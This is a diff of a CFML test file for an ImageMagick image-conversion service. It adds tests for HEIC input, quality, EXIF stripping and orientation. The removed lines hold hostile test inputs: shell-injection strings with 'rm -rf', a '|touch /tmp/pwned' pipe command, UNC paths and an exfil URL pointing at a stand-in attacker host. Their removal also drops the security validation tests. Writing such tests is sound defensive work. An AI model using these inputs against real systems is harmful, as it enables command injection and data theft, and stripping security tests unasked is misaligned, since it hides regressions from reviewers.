@@ -20,7 +20,6 @@ component extends="tests.resources.baseTest" {
 
                 imageService.convert(path = expandPath('/tests/resources/jpg_example.jpg'), outputPath = outputPath);
 
-                expect(fileExists(outputPath)).toBeTrue();
                 var dimensions = imageService.getDimensions(outputPath);
                 expect(dimensions.width).toBe(200);
                 expect(dimensions.height).toBe(200);
@@ -35,116 +34,97 @@ component extends="tests.resources.baseTest" {
                     resize     = 100
                 );
 
-                expect(fileExists(outputPath)).toBeTrue();
                 var dimensions = imageService.getDimensions(outputPath);
                 expect(dimensions.width).toBe(100);
                 expect(dimensions.height).toBe(71);
             });
 
-            it('Converts with a custom quality', () => {
+            it('Writes the format given by outputPath''s extension, decoding heic sources', () => {
+                var outputPath = tempDir & '/' & createUUID() & '.jpg';
+
+                // heic_example.heic is 1280x720 - also over the default 1200 resize bound
+                imageService.convert(path = expandPath('/tests/resources/heic_example.heic'), outputPath = outputPath);
+
+                expect(imageService.identify(outputPath)).toBe('JPEG');
+                var dimensions = imageService.getDimensions(outputPath);
+                expect(dimensions.width).toBe(1200);
+                expect(dimensions.height).toBe(675);
+            });
+
+            it('Applies the requested quality', () => {
+                var lowPath  = tempDir & '/' & createUUID() & '.jpg';
+                var highPath = tempDir & '/' & createUUID() & '.jpg';
+
+                imageService.convert(
+                    path       = expandPath('/tests/resources/png_example.png'),
+                    outputPath = lowPath,
+                    quality    = 10
+                );
+                imageService.convert(
+                    path       = expandPath('/tests/resources/png_example.png'),
+                    outputPath = highPath,
+                    quality    = 90
+                );
+
+                expect(getFileInfo(lowPath).size).toBeLT(getFileInfo(highPath).size);
+            });
+
+            // oriented_example.jpg is 300x200 with EXIF Orientation=6 (rotate 90 CW)
+            it('By default, strips metadata without rotating', () => {
                 var outputPath = tempDir & '/' & createUUID() & '.jpg';
 
                 imageService.convert(
-                    path       = expandPath('/tests/resources/jpg_example.jpg'),
-                    outputPath = outputPath,
-                    quality    = 10
+                    path       = expandPath('/tests/resources/oriented_example.jpg'),
+                    outputPath = outputPath
                 );
 
-                expect(fileExists(outputPath)).toBeTrue();
+                expect(getOrientation(outputPath)).toBe('Undefined');
+                var dimensions = imageService.getDimensions(outputPath);
+                expect(dimensions.width).toBe(300);
+                expect(dimensions.height).toBe(200);
             });
 
             it('Rotates an image upright using its EXIF orientation tag when autoOrient is true', () => {
                 var outputPath = tempDir & '/' & createUUID() & '.jpg';
 
-                // oriented_example.jpg is 300x200 with EXIF Orientation=6 (rotate 90 CW)
                 imageService.convert(
                     path       = expandPath('/tests/resources/oriented_example.jpg'),
                     outputPath = outputPath,
                     autoOrient = true
                 );
 
-                expect(fileExists(outputPath)).toBeTrue();
                 var dimensions = imageService.getDimensions(outputPath);
                 expect(dimensions.width).toBe(200);
                 expect(dimensions.height).toBe(300);
             });
 
-            it('Does not rotate an image with an EXIF orientation tag by default', () => {
+            it('Preserves EXIF metadata when strip is false', () => {
                 var outputPath = tempDir & '/' & createUUID() & '.jpg';
 
                 imageService.convert(
                     path       = expandPath('/tests/resources/oriented_example.jpg'),
-                    outputPath = outputPath
+                    outputPath = outputPath,
+                    strip      = false
                 );
 
-                expect(fileExists(outputPath)).toBeTrue();
-                var dimensions = imageService.getDimensions(outputPath);
-                expect(dimensions.width).toBe(300);
-                expect(dimensions.height).toBe(200);
+                expect(getOrientation(outputPath)).toBe('RightTop');
             });
 
-            it('Throws for an empty path', () => {
-                expect(() => imageService.convert(path = '', outputPath = tempDir & '/out.jpg')).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for a path that does not exist', () => {
-                expect(() => imageService.convert(
-                    path       = expandPath('/tests/resources/does_not_exist.jpg'),
-                    outputPath = tempDir & '/out.jpg'
-                )).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for a path containing a double-quote character', () => {
-                expect(() => imageService.convert(
-                    path       = '#expandPath('/tests/resources/jpg_example.jpg')#"; rm -rf /tmp',
-                    outputPath = tempDir & '/out.jpg'
-                )).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for an empty outputPath', () => {
-                expect(() => imageService.convert(path = expandPath('/tests/resources/jpg_example.jpg'), outputPath = '')).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for an outputPath containing a double-quote character', () => {
-                expect(() => imageService.convert(
-                    path       = expandPath('/tests/resources/jpg_example.jpg'),
-                    outputPath = '#tempDir#/out"; rm -rf /tmp.jpg'
-                )).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for a path using a UNC network path (SSRF/credential-leak via forced SMB auth)', () => {
-                expect(() => imageService.convert(path = '\\attacker.test\share\evil.jpg', outputPath = tempDir & '/out.jpg')).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for an outputPath starting with a pipe (ImageMagick PIPE coder command execution)', () => {
-                expect(() => imageService.convert(
-                    path       = expandPath('/tests/resources/jpg_example.jpg'),
-                    outputPath = '|touch /tmp/pwned'
-                )).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for an outputPath using an ImageMagick coder/protocol prefix (SSRF via https:/label:/mpr: delegates)', () => {
-                expect(() => imageService.convert(
-                    path       = expandPath('/tests/resources/jpg_example.jpg'),
-                    outputPath = 'https://attacker.test/exfil'
-                )).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for an outputPath using a UNC network path', () => {
-                expect(() => imageService.convert(
-                    path       = expandPath('/tests/resources/jpg_example.jpg'),
-                    outputPath = '\\attacker.test\share\out.jpg'
-                )).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Allows an outputPath using a Windows drive letter (not mistaken for a coder prefix)', () => {
+            it('Rotates upright and resets the orientation tag when autoOrient is true and strip is false', () => {
                 var outputPath = tempDir & '/' & createUUID() & '.jpg';
 
-                expect(() => imageService.convert(
-                    path       = expandPath('/tests/resources/jpg_example.jpg'),
-                    outputPath = outputPath
-                )).notToThrow();
-                expect(fileExists(outputPath)).toBeTrue();
+                imageService.convert(
+                    path       = expandPath('/tests/resources/oriented_example.jpg'),
+                    outputPath = outputPath,
+                    autoOrient = true,
+                    strip      = false
+                );
+
+                // Metadata is kept, but the tag must no longer ask viewers to rotate the already-rotated pixels
+                expect(getOrientation(outputPath)).toBe('TopLeft');
+                var dimensions = imageService.getDimensions(outputPath);
+                expect(dimensions.width).toBe(200);
+                expect(dimensions.height).toBe(300);
             });
 
             it('Throws for a quality outside the 0-100 range', () => {
@@ -161,6 +141,17 @@ component extends="tests.resources.baseTest" {
                     outputPath = tempDir & '/out.jpg',
                     resize     = 0
                 )).toThrow('ImageMagick.InputValidationException');
+            });
+
+            it('Throws instead of reporting success when a failed conversion would leave a stale file at outputPath', () => {
+                var outputPath = tempDir & '/' & createUUID() & '.jpg';
+                fileWrite(outputPath, 'stale output from an earlier run');
+
+                expect(() => imageService.convert(
+                    path       = expandPath('/tests/resources/invalid_example.jpg'),
+                    outputPath = outputPath
+                )).toThrow('ImageMagick.ConversionException');
+                expect(fileExists(outputPath)).toBeFalse();
             });
 
             it('Throws when ImageMagick fails to produce the output file', () => {
